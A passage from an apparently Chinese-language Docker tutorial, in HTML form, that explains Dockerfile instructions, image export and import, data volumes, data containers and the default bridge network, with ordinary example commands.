image</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x7AEF;&#x53E3;&#x6620;&#x5C04;&#x662F;docker&#x6BD4;&#x8F83;&#x91CD;&#x8981;&#x7684;&#x4E00;&#x4E2A;&#x529F;&#x80FD;&#xFF0C;&#x539F;&#x56E0;&#x5728;&#x4E8E;&#x6211;&#x4EEC;&#x6BCF;&#x6B21;&#x8FD0;&#x884C;&#x5BB9;&#x5668;&#x7684;&#x65F6;&#x5019;&#x5BB9;&#x5668;&#x7684;IP&#x5730;&#x5740;&#x4E0D;&#x80FD;&#x6307;&#x5B9A;&#x800C;&#x662F;&#x5728;&#x6865;&#x63A5;&#x7F51;&#x5361;&#x7684;&#x5730;&#x5740;&#x8303;&#x56F4;&#x5185;&#x968F;&#x673A;&#x751F;&#x6210;&#x7684;&#x3002;&#x5BBF;&#x4E3B;&#x673A;&#x5668;&#x7684;IP&#x5730;&#x5740;&#x662F;&#x56FA;&#x5B9A;&#x7684;&#xFF0C;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x5C06;&#x5BB9;&#x5668;&#x7684;&#x7AEF;&#x53E3;&#x6620;&#x5C04;&#x5230;&#x5BBF;&#x4E3B;&#x673A;&#x5668;&#x4E0A;&#x7684;&#x4E00;&#x4E2A;&#x7AEF;&#x53E3;&#xFF0C;&#x514D;&#x53BB;&#x6BCF;&#x6B21;&#x8BBF;&#x95EE;&#x5BB9;&#x5668;&#x4E2D;&#x7684;&#x67D0;&#x4E2A;&#x670D;&#x52A1;&#x65F6;&#x90FD;&#x8981;&#x67E5;&#x770B;&#x5BB9;&#x5668;&#x7684;IP&#x5730;&#x5740;&#x3002;&#x5BF9;&#x4E8E;&#x4E00;&#x4E2A;&#x8FD0;&#x884C;&#x7684;&#x5BB9;&#x5668;&#xFF0C;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;docker port&#x52A0;&#x4E0A;&#x5BB9;&#x5668;&#x4E2D;&#x9700;&#x8981;&#x6620;&#x5C04;&#x7684;&#x7AEF;&#x53E3;&#x548C;&#x5BB9;&#x5668;&#x7684;ID&#x6765;&#x67E5;&#x770B;&#x8BE5;&#x7AEF;&#x53E3;&#x53F7;&#x5728;&#x5BBF;&#x4E3B;&#x673A;&#x5668;&#x4E0A;&#x7684;&#x6620;&#x5C04;&#x7AEF;&#x53E3;&#x3002;</p><ul><li>ENV&#xFF08;&#x7528;&#x4E8E;&#x8BBE;&#x7F6E;&#x73AF;&#x5883;&#x53D8;&#x91CF;<br>&#x6784;&#x5EFA;&#x6307;&#x4EE4;&#xFF0C;&#x5728;image&#x4E2D;&#x8BBE;&#x7F6E;&#x4E00;&#x4E2A;&#x73AF;&#x5883;&#x53D8;&#x91CF;&#x3002;<figure class="highlight dockerfile"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ENV</span> &lt;key&gt; &lt;value&gt;</span><br></pre></td></tr></tbody></table></figure></li></ul><p>&#x8BBE;&#x7F6E;&#x4E86;&#x540E;&#xFF0C;&#x540E;&#x7EED;&#x7684;RUN&#x547D;&#x4EE4;&#x90FD;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;&#xFF0C;container&#x542F;&#x52A8;&#x540E;&#xFF0C;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;docker inspect&#x67E5;&#x770B;&#x8FD9;&#x4E2A;&#x73AF;&#x5883;&#x53D8;&#x91CF;&#xFF0C;&#x4E5F;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;&#x5728;docker run &#x2013;env key=value&#x65F6;&#x8BBE;&#x7F6E;&#x6216;&#x4FEE;&#x6539;&#x73AF;&#x5883;&#x53D8;&#x91CF;&#x3002;<br>&#x5047;&#x5982;&#x4F60;&#x5B89;&#x88C5;&#x4E86;JAVA&#x7A0B;&#x5E8F;&#xFF0C;&#x9700;&#x8981;&#x8BBE;&#x7F6E;JAVA_HOME&#xFF0C;&#x90A3;&#x4E48;&#x53EF;&#x4EE5;&#x5728;Dockerfile&#x4E2D;&#x8FD9;&#x6837;&#x5199;&#xFF1A;<br></p><figure class="highlight dockerfile"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ENV</span> JAVA_HOME /path/to/java/dirent</span><br></pre></td></tr></tbody></table></figure><p></p><ul><li>ADD&#xFF08;&#x4ECE;src&#x590D;&#x5236;&#x6587;&#x4EF6;&#x5230;container&#x7684;dest&#x8DEF;&#x5F84;&#xFF09;</li></ul><p>&#x6784;&#x5EFA;&#x6307;&#x4EE4;&#xFF0C;&#x6240;&#x6709;&#x62F7;&#x8D1D;&#x5230;container&#x4E2D;&#x7684;&#x6587;&#x4EF6;&#x548C;&#x6587;&#x4EF6;&#x5939;&#x6743;&#x9650;&#x4E3A;0755&#xFF0C;uid&#x548C;gid&#x4E3A;0&#xFF1B;&#x5982;&#x679C;&#x662F;&#x4E00;&#x4E2A;&#x76EE;&#x5F55;&#xFF0C;&#x90A3;&#x4E48;&#x4F1A;&#x5C06;&#x8BE5;&#x76EE;&#x5F55;&#x4E0B;&#x7684;&#x6240;&#x6709;&#x6587;&#x4EF6;&#x6DFB;&#x52A0;&#x5230;container&#x4E2D;&#xFF0C;&#x4E0D;&#x5305;&#x62EC;&#x76EE;&#x5F55;&#xFF1B;&#x5982;&#x679C;&#x6587;&#x4EF6;&#x662F;&#x53EF;&#x8BC6;&#x522B;&#x7684;&#x538B;&#x7F29;&#x683C;&#x5F0F;&#xFF0C;&#x5219;docker&#x4F1A;&#x5E2E;&#x5FD9;&#x89E3;&#x538B;&#x7F29;&#xFF08;&#x6CE8;&#x610F;&#x538B;&#x7F29;&#x683C;&#x5F0F;&#xFF09;&#xFF1B;&#x5982;&#x679C;\<src>&#x662F;&#x6587;&#x4EF6;&#x4E14;\<dest>&#x4E2D;&#x4E0D;&#x4F7F;&#x7528;&#x659C;&#x6760;&#x7ED3;&#x675F;&#xFF0C;&#x5219;&#x4F1A;&#x5C06;\<dest>&#x89C6;&#x4E3A;&#x6587;&#x4EF6;&#xFF0C;\<src>&#x7684;&#x5185;&#x5BB9;&#x4F1A;&#x5199;&#x5165;\<dest>&#xFF1B;&#x5982;&#x679C;\<src>&#x662F;&#x6587;&#x4EF6;&#x4E14;\<dest>&#x4E2D;&#x4F7F;&#x7528;&#x659C;&#x6760;&#x7ED3;&#x675F;&#xFF0C;&#x5219;&#x4F1A;\<src>&#x6587;&#x4EF6;&#x62F7;&#x8D1D;&#x5230;\<dest>&#x76EE;&#x5F55;&#x4E0B;&#x3002;<br></dest></src></dest></src></dest></src></dest></dest></src></p><figure class="highlight dockerfile"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ADD</span><span class="bash"> &lt;src&gt; &lt;dest&gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p><p><code>&lt;src&gt;</code>&#x662F;&#x76F8;&#x5BF9;&#x88AB;&#x6784;&#x5EFA;&#x7684;&#x6E90;&#x76EE;&#x5F55;&#x7684;&#x76F8;&#x5BF9;&#x8DEF;&#x5F84;&#xFF0C;&#x53EF;&#x4EE5;&#x662F;&#x6587;&#x4EF6;&#x6216;&#x76EE;&#x5F55;&#x7684;&#x8DEF;&#x5F84;&#xFF0C;&#x4E5F;&#x53EF;&#x4EE5;&#x662F;&#x4E00;&#x4E2A;&#x8FDC;&#x7A0B;&#x7684;&#x6587;&#x4EF6;url;<br><code>&lt;dest&gt;</code>&#x662F;container&#x4E2D;&#x7684;&#x7EDD;&#x5BF9;&#x8DEF;&#x5F84;</p><ul><li>VOLUME&#xFF08;&#x6307;&#x5B9A;&#x6302;&#x8F7D;&#x70B9;&#xFF09;</li></ul><p>&#x8BBE;&#x7F6E;&#x6307;&#x4EE4;&#xFF0C;&#x4F7F;&#x5BB9;&#x5668;&#x4E2D;&#x7684;&#x4E00;&#x4E2A;&#x76EE;&#x5F55;&#x5177;&#x6709;&#x6301;&#x4E45;&#x5316;&#x5B58;&#x50A8;&#x6570;&#x636E;&#x7684;&#x529F;&#x80FD;&#xFF0C;&#x8BE5;&#x76EE;&#x5F55;&#x53EF;&#x4EE5;&#x88AB;&#x5BB9;&#x5668;&#x672C;&#x8EAB;&#x4F7F;&#x7528;&#xFF0C;&#x4E5F;&#x53EF;&#x4EE5;&#x5171;&#x4EAB;&#x7ED9;&#x5176;&#x4ED6;&#x5BB9;&#x5668;&#x4F7F;&#x7528;&#x3002;&#x6211;&#x4EEC;&#x77E5;&#x9053;&#x5BB9;&#x5668;&#x4F7F;&#x7528;&#x7684;&#x662F;AUFS&#xFF0C;&#x8FD9;&#x79CD;&#x6587;&#x4EF6;&#x7CFB;&#x7EDF;&#x4E0D;&#x80FD;&#x6301;&#x4E45;&#x5316;&#x6570;&#x636E;&#xFF0C;&#x5F53;&#x5BB9;&#x5668;&#x5173;&#x95ED;&#x540E;&#xFF0C;&#x6240;&#x6709;&#x7684;&#x66F4;&#x6539;&#x90FD;&#x4F1A;&#x4E22;&#x5931;&#x3002;&#x5F53;&#x5BB9;&#x5668;&#x4E2D;&#x7684;&#x5E94;&#x7528;&#x6709;&#x6301;&#x4E45;&#x5316;&#x6570;&#x636E;&#x7684;&#x9700;&#x6C42;&#x65F6;&#x53EF;&#x4EE5;&#x5728;Dockerfile&#x4E2D;&#x4F7F;&#x7528;&#x8BE5;&#x6307;&#x4EE4;&#x3002;</p><figure class="highlight dockerfile"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">FROM</span> base</span><br><span class="line"><span class="keyword">VOLUME</span><span class="bash"> [<span class="string">&quot;/tmp/data&quot;</span>]</span></span><br></pre></td></tr></tbody></table></figure><ul><li>WORKDIR&#xFF08;&#x5207;&#x6362;&#x76EE;&#x5F55;&#xFF09;<br>&#x8BBE;&#x7F6E;&#x6307;&#x4EE4;&#xFF0C;&#x53EF;&#x4EE5;&#x591A;&#x6B21;&#x5207;&#x6362;&#xFF08;&#x76F8;&#x5F53;&#x4E8E;cd&#x547D;&#x4EE4;&#xFF0C;&#x5BF9;RUN,CMD,ENTRYPOINT&#x751F;&#x6548;<figure class="highlight dockerfile"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># &#x5728; /p1/p2&#x4E0B;&#x6267;&#x884C; vim a.txt</span></span><br><span class="line"><span class="keyword">WORKDIR</span><span class="bash"> /p1 WORKDIR p2 RUN vim a.txt</span></span><br></pre></td></tr></tbody></table></figure></li></ul><p><strong>2.7 &#x955C;&#x50CF;&#x5BFC;&#x5165;&#x5BFC;&#x51FA;</strong></p><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker save -o centos6.5.tar centos6.5 # &#x6216;</span><br><span class="line">docker export f9c99092063c &gt; centos6.5.tar</span><br></pre></td></tr></tbody></table></figure><p>&#x5C06;&#x672C;&#x5730;&#x955C;&#x50CF;&#x5BFC;&#x5165;<br></p><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker load --input cnetos6.5.tar #&#x6216;</span><br><span class="line">docker load &lt; centos6.5.tar</span><br></pre></td></tr></tbody></table></figure><p></p><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker exec -it CONTAINER ID /bin/bash</span><br></pre></td></tr></tbody></table></figure><h2 id="&#x4E09;&#x3001;&#x5B58;&#x50A8;"><a href="#&#x4E09;&#x3001;&#x5B58;&#x50A8;" class="headerlink" title="&#x4E09;&#x3001;&#x5B58;&#x50A8;"></a>&#x4E09;&#x3001;&#x5B58;&#x50A8;</h2><p><strong>3.1 &#x6570;&#x636E;&#x76D8;</strong></p><p>docker&#x7684;&#x955C;&#x50CF;&#x4F7F;&#x7528;&#x4E00;&#x5C42;&#x4E00;&#x5C42;&#x6587;&#x4EF6;&#x7EC4;&#x6210;&#x7684;&#xFF0C;docker&#x7684;&#x4E00;&#x4E9B;&#x5B58;&#x50A8;&#x5F15;&#x64CE;&#x53EF;&#x4EE5;&#x5904;&#x7406;&#x600E;&#x4E48;&#x6837;&#x5B58;&#x50A8;&#x8FD9;&#x4E9B;&#x6587;&#x4EF6;&#x3002;</p><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker inspect centos  # &#x67E5;&#x770B;&#x5BB9;&#x5668;&#x8BE6;&#x7EC6;&#x4FE1;&#x606F;</span><br></pre></td></tr></tbody></table></figure><p>&#x4FE1;&#x606F;&#x4E0B;&#x65B9;&#x7684;Layers&#xFF0C;&#x5C31;&#x662F;centos&#x7684;&#x6587;&#x4EF6;&#xFF0C;&#x8FD9;&#x4E9B;&#x4E1C;&#x897F;&#x90FD;&#x662F;&#x53EA;&#x8BFB;&#x7684;&#x4E0D;&#x80FD;&#x53BB;&#x4FEE;&#x6539;&#xFF0C;&#x6211;&#x4EEC;&#x57FA;&#x4E8E;&#x8FD9;&#x4E2A;&#x955C;&#x50CF;&#x53BB;&#x521B;&#x5EFA;&#x7684;&#x955C;&#x50CF;&#x548C;&#x5BB9;&#x5668;&#x4E5F;&#x4F1A;&#x5171;&#x4EAB;&#x8FD9;&#x4E9B;&#x6587;&#x4EF6;&#x5C42;&#xFF0C;&#x800C;docker&#x4F1A;&#x5728;&#x8FD9;&#x4E9B;&#x5C42;&#x4E0A;&#x9762;&#x53BB;&#x6DFB;&#x52A0;&#x4E00;&#x4E2A;&#x53EF;&#x8BFB;&#x5199;&#x7684;&#x6587;&#x4EF6;&#x5C42;&#x3002;&#x5982;&#x679C;&#x9700;&#x8981;&#x4FEE;&#x6539;&#x4E00;&#x4E9B;&#x6587;&#x4EF6;&#x5C42;&#x91CC;&#x9762;&#x7684;&#x4E1C;&#x897F;&#x7684;&#x8BDD;&#xFF0C;docker&#x4F1A;&#x590D;&#x5236;&#x4E00;&#x4EFD;&#x5230;&#x8FD9;&#x4E2A;&#x53EF;&#x8BFB;&#x5199;&#x7684;&#x6587;&#x4EF6;&#x5C42;&#x91CC;&#x9762;&#xFF0C;&#x5982;&#x679C;&#x5220;&#x9664;&#x5BB9;&#x5668;&#x7684;&#x8BDD;&#xFF0C;&#x90A3;&#x4E48;&#x4E5F;&#x4F1A;&#x5220;&#x9664;&#x5B83;&#x5BF9;&#x5E94;&#x7684;&#x53EF;&#x8BFB;&#x5199;&#x7684;&#x6587;&#x4EF6;&#x5C42;&#x7684;&#x6587;&#x4EF6;&#x3002;&#x5982;&#x679C;&#x6709;&#x4E9B;&#x6570;&#x636E;&#x4F60;&#x60F3;&#x4E00;&#x76F4;&#x4FDD;&#x5B58;&#x7684;&#x8BDD;&#xFF0C;&#x6BD4;&#x5982;&#xFF1A;web&#x670D;&#x52A1;&#x5668;&#x4E0A;&#x9762;&#x7684;&#x65E5;&#x5FD7;&#xFF0C;&#x6570;&#x636E;&#x5E93;&#x7BA1;&#x7406;&#x7CFB;&#x7EDF;&#x91CC;&#x9762;&#x7684;&#x6570;&#x636E;&#xFF0C;&#x90A3;&#x4E48;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x628A;&#x8FD9;&#x4E9B;&#x6570;&#x636E;&#x653E;&#x5230;data volumes&#x6570;&#x636E;&#x76D8;&#x91CC;&#x9762;&#x3002;&#x5B83;&#x4E0A;&#x9762;&#x7684;&#x6570;&#x636E;&#xFF0C;&#x5373;&#x4F7F;&#x628A;&#x5BB9;&#x5668;&#x5220;&#x6389;&#xFF0C;&#x4E5F;&#x8FD8;&#x662F;&#x4F1A;&#x6C38;&#x4E45;&#x4FDD;&#x7559;&#x3002;&#x521B;&#x5EFA;&#x5BB9;&#x5668;&#x7684;&#x65F6;&#x5019;&#xFF0C;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x53BB;&#x6307;&#x5B9A;&#x6570;&#x636E;&#x76D8;&#x3002;&#x5176;&#x5B9E;&#x5C31;&#x662F;&#x53BB;&#x6307;&#x5B9A;&#x4E00;&#x4E2A;&#x7279;&#x5B9A;&#x7684;&#x76EE;&#x5F55;&#x3002;</p><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -i -t -v /mnt --name nginx docker.io/nginx /bin/bash</span><br></pre></td></tr></tbody></table></figure><p><code>-v</code>&#xFF1A;&#x6307;&#x5B9A;&#x6302;&#x8F7D;&#x5230;&#x5BB9;&#x5668;&#x5185;&#x7684;&#x76EE;&#x5F55;<br>&#x4F7F;&#x7528;docker insepect&#x5BB9;&#x5668;ID&#x53EF;&#x4EE5;&#x67E5;&#x770B;&#x6302;&#x8F7D;&#x76EE;&#x5F55;&#x5BF9;&#x5E94;&#x4E8E;&#x5BBF;&#x4E3B;&#x673A;&#x5668;&#x7684;&#x7269;&#x7406;&#x6587;&#x4EF6;&#x8DEF;&#x5F84;<br>&#x540C;&#x6837;&#xFF0C;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;&#x5C06;&#x5236;&#x5B9A;&#x7269;&#x7406;&#x5BBF;&#x4E3B;&#x673A;&#x7684;&#x76EE;&#x5F55;&#x6302;&#x8F7D;&#x5230;&#x5BB9;&#x5668;&#x7684;&#x5236;&#x5B9A;&#x76EE;&#x5F55;&#x4E0B;&#xFF1A;</p><p>&#x5C06;&#x5BBF;&#x4E3B;&#x673A;&#x76EE;&#x5F55;&#x6302;&#x8F7D;&#x5230;&#x5BB9;&#x5668;&#x5185;&#xFF1A;</p><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -d -p 80:80 --name nginx -v /webdata/wordpress:/usr/share/nginx/html docker.io/sergyzh/centos6-nginx</span><br></pre></td></tr></tbody></table></figure><p><code>-d</code>&#x540E;&#x53F0;&#x8FD0;&#x884C;<br><code>--name</code>&#x7ED9;&#x8FD0;&#x884C;&#x7684;&#x5BB9;&#x5668;&#x547D;&#x540D;<br><code>-v</code>&#x5BBF;&#x4E3B;&#x673A;&#x76EE;&#x5F55;:&#x5BB9;&#x5668;&#x76EE;&#x5F55; &#x5C06;&#x5BBF;&#x4E3B;&#x673A;&#x76EE;&#x5F55;&#x6302;&#x8F7D;&#x5728;&#x5BB9;&#x5668;&#x5185;<br><code>-p</code> &#x5BBF;&#x4E3B;&#x673A;&#x7AEF;&#x53E3;:&#x5BB9;&#x5668;&#x76D1;&#x542C;&#x7AEF;&#x53E3; &#x5C06;&#x5BB9;&#x5668;&#x5185;&#x5E94;&#x7528;&#x76D1;&#x542C;&#x7AEF;&#x53E3;&#x6620;&#x5C04;&#x5230;&#x7269;&#x7406;&#x5BBF;&#x4E3B;&#x673A;&#x7684;&#x7279;&#x5B9A;&#x7AEF;&#x53E3;&#x4E0A;</p><p><strong>3.2 &#x6570;&#x636E;&#x5BB9;&#x5668;</strong></p><p>&#x53EF;&#x4EE5;&#x521B;&#x5EFA;&#x4E00;&#x4E2A;&#x6570;&#x636E;&#x5BB9;&#x5668;&#xFF0C;&#x4E5F;&#x5C31;&#x662F;&#x518D;&#x521B;&#x5EFA;&#x5BB9;&#x5668;&#x662F;&#x6307;&#x5B9A;&#x8FD9;&#x4E2A;&#x5BB9;&#x5668;&#x7684;&#x6570;&#x636E;&#x76D8;&#xFF0C;&#x7136;&#x540E;&#x8BA9;&#x5176;&#x4ED6;&#x5BB9;&#x5668;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;&#x8FD9;&#x4E2A;&#x5BB9;&#x5668;&#x4F5C;&#x4E3A;&#x4ED6;&#x4EEC;&#x7684;&#x6570;&#x636E;&#x76D8;&#xFF0C;&#x6709;&#x70B9;&#x50CF;&#x7EE7;&#x627F;&#x4E86;&#x8FD9;&#x4E2A;&#x6570;&#x636E;&#x5BB9;&#x5668;&#x6307;&#x5B9A;&#x7684;&#x6570;&#x636E;&#x76D8;&#x4F5C;&#x4E3A;&#x6570;&#x636E;&#x76D8;&#x3002;</p><p>&#x9996;&#x5148;&#x521B;&#x5EFA;&#x4E00;&#x4E2A;&#x6570;&#x636E;&#x5BB9;&#x5668;&#x547D;&#x540D;&#x4E3A;newnginx</p><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker create -v /mnt -it --name newnginx docker.io/nginx /bin/bash</span><br></pre></td></tr></tbody></table></figure><p>&#x5229;&#x7528;&#x6B64;&#x6570;&#x636E;&#x5BB9;&#x5668;&#x5BB9;&#x5668;&#x8FD0;&#x884C;&#x4E00;&#x4E2A;&#x5BB9;&#x5668;nginx1,&#x5728;&#x6570;&#x636E;&#x76EE;&#x5F55;/mnt &#x4E0B;&#x521B;&#x5EFA;&#x4E00;&#x4E2A;&#x6587;&#x4EF6;</p><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run --volumes-from newnginx --name nginx1 -it docker.io/nginx /bin/bash</span><br></pre></td></tr></tbody></table></figure><p>&#x5229;&#x7528;&#x6570;&#x636E;&#x5BB9;&#x5668;&#x5728;&#x521B;&#x5EFA;&#x4E00;&#x4E2A;&#x5BB9;&#x5668;nginx2&#xFF0C;&#x67E5;&#x770B;&#x6570;&#x636E;&#x76EE;&#x5F55;&#x4E0B;&#x5BB9;&#x5668;nginx1&#x521B;&#x5EFA;&#x7684;&#x6587;&#x4EF6;&#x4F9D;&#x65E7;&#x5B58;&#x5728;&#xFF0C;&#x540C;&#x7406;&#x5728;nginx2&#x7684;/mnt&#x4E0B;&#x521B;&#x5EFA;&#x6587;&#x4EF6;&#xFF0C;&#x5176;&#x4ED6;&#x57FA;&#x4E8E;&#x6570;&#x636E;&#x5BB9;&#x5668;&#x8FD0;&#x884C;&#x7684;&#x65B0;&#x5BB9;&#x5668;&#x4E5F;&#x53EF;&#x4EE5;&#x770B;&#x5230;&#x6587;&#x4EF6;</p><p><strong>3.3 &#x6570;&#x636E;&#x76D8;&#x7BA1;&#x7406;</strong></p><p>&#x5728;&#x5220;&#x9664;&#x5BB9;&#x5668;&#x65F6;&#xFF0C;docker&#x9ED8;&#x8BA4;&#x4E0D;&#x4F1A;&#x5220;&#x9664;&#x5176;&#x6570;&#x636E;&#x76D8;&#x3002;</p><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">docker volume ls   # &#x67E5;&#x770B;&#x6570;&#x636E;&#x76D8;</span><br><span class="line">docker volume ls -f dangling=true    # &#x67E5;&#x770B;&#x672A;&#x88AB;&#x5BB9;&#x5668;&#x4F7F;&#x7528;&#x7684;&#x6570;&#x636E;&#x76D8;</span><br><span class="line">docker volume rm VOLUME NAME    # &#x5220;&#x9664;&#x6570;&#x636E;&#x76D8;</span><br></pre></td></tr></tbody></table></figure><p>&#x5982;&#x679C;&#x60F3;&#x8981;&#x5220;&#x9664;&#x5BB9;&#x5668;&#x65F6;&#xFF0C;&#x540C;&#x65F6;&#x5220;&#x9664;&#x6389;&#x5176;&#x6570;&#x636E;&#x76D8;&#xFF0C;&#x90A3;&#x4E48;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;<code>-v</code>&#x53C2;&#x6570;&#x3002;</p><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker rm -v newnginx</span><br></pre></td></tr></tbody></table></figure><h2 id="&#x56DB;&#x3001;&#x7F51;&#x7EDC;"><a href="#&#x56DB;&#x3001;&#x7F51;&#x7EDC;" class="headerlink" title="&#x56DB;&#x3001;&#x7F51;&#x7EDC;"></a>&#x56DB;&#x3001;&#x7F51;&#x7EDC;</h2><p>docker&#x63D0;&#x4F9B;&#x51E0;&#x79CD;&#x7F51;&#x7EDC;&#xFF0C;&#x5B83;&#x51B3;&#x5B9A;&#x5BB9;&#x5668;&#x4E4B;&#x95F4;&#x548C;&#x5916;&#x754C;&#x548C;&#x5BB9;&#x5668;&#x4E4B;&#x95F4;&#x5982;&#x4F55;&#x53BB;&#x76F8;&#x4E92;&#x901A;&#x4FE1;<br></p><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker newwork ls  # &#x67E5;&#x770B;&#x7F51;&#x7EDC;</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x5F53;Docker&#x8FDB;&#x7A0B;&#x542F;&#x52A8;&#x65F6;&#xFF0C;&#x4F1A;&#x5728;&#x4E3B;&#x673A;&#x4E0A;&#x521B;&#x5EFA;&#x4E00;&#x4E2A;&#x540D;&#x4E3A;docker0&#x7684;&#x865A;&#x62DF;&#x7F51;&#x6865;&#xFF0C;&#x6B64;&#x4E3B;&#x673A;&#x4E0A;&#x542F;&#x52A8;&#x7684;Docker&#x5BB9;&#x5668;&#x4F1A;&#x8FDE;&#x63A5;&#x5230;&#x8FD9;&#x4E2A;&#x865A;&#x62DF;&#x7F51;&#x6865;&#x4E0A;&#x3002;&#x865A;&#x62DF;&#x7F51;&#x6865;&#x7684;&#x5DE5;&#x4F5C;&#x65B9;&#x5F0F;&#x548C;&#x7269;&#x7406;&#x4EA4;&#x6362;&#x673A;&#x7C7B;&#x4F3C;&#xFF0C;&#x8FD9;&#x6837;&#x4E3B;&#x673A;&#x4E0A;&#x7684;&#x6240;&#x6709;&#x5BB9;&#x5668;&#x5C31;&#x901A;&#x8FC7;&#x4EA4;&#x6362;&#x673A;&#x8FDE;&#x5728;&#x4E86;&#x4E00;&#x4E2A;&#x4E8C;&#x5C42;&#x7F51;&#x7EDC;&#x4E2D;&#x3002;&#x4ECE;docker0&#x5B50;&#x7F51;&#x4E2D;&#x5206;&#x914D;&#x4E00;&#x4E2A;IP&#x7ED9;&#x5BB9;&#x5668;&#x4F7F;&#x7528;&#xFF0C;&#x5E76;&#x8BBE;&#x7F6E;docker0&#x7684;IP&#x5730;&#x5740;&#x4E3A;&#x5BB9;&#x5668;&#x7684;&#x9ED8;&#x8BA4;&#x7F51;&#x5173;&#x3002;&#x5728;&#x4E3B;&#x673A;&#x4E0A;&#x521B;&#x5EFA;&#x4E00;&#x5BF9;&#x865A;&#x62DF;&#x7F51;&#x5361;veth pair&#x8BBE;&#x5907;&#xFF0C;Docker&#x5C06;veth pair&#x8BBE;&#x5907;&#x7684;&#x4E00;&#x7AEF;&#x653E;&#x5728;&#x65B0;&#x521B;&#x5EFA;&#x7684;&#x5BB9;&#x5668;&#x4E2D;&#xFF0C;&#x5E76;&#x547D;&#x540D;&#x4E3A;eth0&#xFF08;&#x5BB9;&#x5668;&#x7684;&#x7F51;&#x5361;&#xFF09;&#xFF0C;&#x53E6;&#x4E00;&#x7AEF;&#x653E;&#x5728;&#x4E3B;&#x673A;&#x4E2D;&#xFF0C;&#x4EE5;vethxxx&#x8FD9;&#x6837;&#x7C7B;&#x4F3C;&#x7684;&#x540D;&#x5B57;&#x547D;&#x540D;&#xFF0C;&#x5E76;&#x5C06;&#x8FD9;&#x4E2A;&#x7F51;&#x7EDC;&#x8BBE;&#x5907;&#x52A0;&#x5165;&#x5230;docker0&#x7F51;&#x6865;&#x4E2D;&#x3002;</p><p><strong>4.1 bridge&#x6865;&#x63A5;&#x7F51;&#x7EDC;</strong></p><p>&#x9664;&#x975E;&#x521B;&#x5EFA;&#x5BB9;&#x5668;&#x7684;&#x65F6;&#x5019;&#x6307;&#x5B9A;&#x7F51;&#x7EDC;&#xFF0C;&#x4E0D;&#x7136;&#x5BB9;&#x5668;&#x5C31;&#x4F1A;&#x9ED8;&#x8BA4;&#x7684;&#x4F7F;&#x7528;&#x6865;&#x63A5;&#x7F51;&#x7EDC;&#x3002;&#x5C5E;&#x4E8E;&#x8FD9;&#x4E2A;&#x7F51;&#x7EDC;&#x7684;&#x5BB9;&#x5668;&#x4E4B;&#x95F4;&#x53EF;&#x4EE5;&#x76F8;&#x4E92;&#x901A;&#x4FE1;&#xFF0C;&#x4E0D;&#x8FC7;&#x5916;&#x754C;&#x60F3;&#x8981;&#x8BBF;&#x95EE;&#x5230;&#x8FD9;&#x4E2A;&#x7F51;&#x7EDC;&#x7684;&#x5BB9;&#x5668;&#x5462;&#xFF0C;&#x9700;&#x4F7F;&#x7528;&#x6865;&#x63A5;&#x7F51;&#x7EDC;&#xFF0C;&#x6709;&#x70B9;&#x50CF;&#x4E3B;&#x673A;&#x548C;&#x5BB9;&#x5668;&#x4E4B;&#x95F4;&#x7684;&#x4E00;&#x5EA7;&#x6865;&#xFF0C;&#x5BF9;&#x5BB9;&#x5668;&#x6709;&#x4E00;&#x70B9;&#x9694;&#x79BB;&#x4F5C;&#x7528;&#x3002;&#x5B9E;&#x9645;&#x662F;&#x5728;iptables&#x505A;&#x4E86;DNAT&#x89C4;&#x5219;&#xFF0C;&#x5B9E;&#x73B0;&#x7AEF;&#x53E3;&#x8F6C;&#x53D1;&#x529F;&#x80FD;&#x3002;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;iptables -t nat -vnL&#x67E5;&#x770B;&#x3002;</p><p><strong>4.2 